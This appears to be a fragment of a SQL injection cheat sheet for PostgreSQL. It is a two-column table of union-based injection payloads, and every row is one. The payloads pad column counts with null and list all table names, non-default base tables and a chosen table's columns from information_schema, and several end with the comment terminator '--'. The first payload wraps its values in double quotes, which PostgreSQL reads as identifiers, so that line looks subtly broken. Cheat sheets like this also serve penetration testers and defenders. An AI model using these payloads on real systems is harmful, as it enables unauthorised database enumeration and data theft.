Description Query
Union null
Note: If original query returns more than one column, add null to equal the number of columns		 SELECT "postgres","test" UNION SELECT version(),null
Union to retrieve all table names SELECT 'postgres' UNION SELECT table_name FROM information_schema.tables--
Union to retrieve table names that are not pre-built/default SELECT 'postgres' UNION SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema') AND table_schema NOT LIKE 'pg_toast%' AND table_type = 'BASE TABLE'--
Union to retrieve columns in a table
Note: table name is case-sensitive		 SELECT 'postgres' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME'--
